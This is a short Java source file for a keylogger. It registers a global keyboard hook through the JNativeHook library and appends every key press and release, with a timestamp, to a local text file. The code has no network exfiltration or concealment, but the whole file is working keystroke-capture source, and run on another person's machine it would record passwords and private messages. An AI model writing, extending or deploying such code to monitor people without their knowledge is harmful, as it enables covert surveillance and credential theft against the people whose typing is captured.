package main;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import java.io.*;
import java.nio.file.*;
import java.text.SimpleDateFormat;
import java.util.Date;

public class KeyLogger implements NativeKeyListener {

    //Path do KeyLogger Text.
    private static final Path file = Paths.get("src/main/java/log_files/keylog.txt");

    //Data Format (CURRENT ON BRAZILIAN TIMEZONE)
    private SimpleDateFormat dateFormat = new SimpleDateFormat("dd/MM/yyyy HH:mm:ss");

    public static void main(String[] args) {
        try{
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException e){
            System.exit(-1);
        }
        GlobalScreen.addNativeKeyListener(new KeyLogger());
    }


    @Override
    public void nativeKeyPressed(NativeKeyEvent e) {
        String keyText = NativeKeyEvent.getKeyText(e.getKeyCode());
        Date currentDate = new Date();
        String formattedDateTime = dateFormat.format(currentDate);
        try(OutputStream os = Files.newOutputStream(file, StandardOpenOption.CREATE, StandardOpenOption.WRITE, StandardOpenOption.APPEND); PrintWriter writer = new PrintWriter(os)){
            if(keyText.length() > 1){
                writer.println("[" + formattedDateTime + "] - KEY PRESSED: " + "[" + keyText + "]");
            } else  {
                writer.println("[" + formattedDateTime + "] - KEY PRESSED: " + keyText);
            }
        } catch (IOException exception){
            System.exit(-1);
        }
    }
    @Override
    public void nativeKeyReleased(NativeKeyEvent e) {
        String keyText = NativeKeyEvent.getKeyText(e.getKeyCode());
        Date currentDate = new Date();
        String formattedDateTime = dateFormat.format(currentDate);
        try(OutputStream os = Files.newOutputStream(file, StandardOpenOption.CREATE, StandardOpenOption.WRITE, StandardOpenOption.APPEND); PrintWriter writer = new PrintWriter(os)){
            if(keyText.length() > 1){
                writer.println("[" + formattedDateTime + "] - KEY RELEASED: " + "[" + keyText + "]");
            } else  {
                writer.println("[" + formattedDateTime + "] - KEY RELEASED: " + keyText);
            }
        } catch (IOException exception){
            System.exit(-1);
        }
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent e) {

    }
}
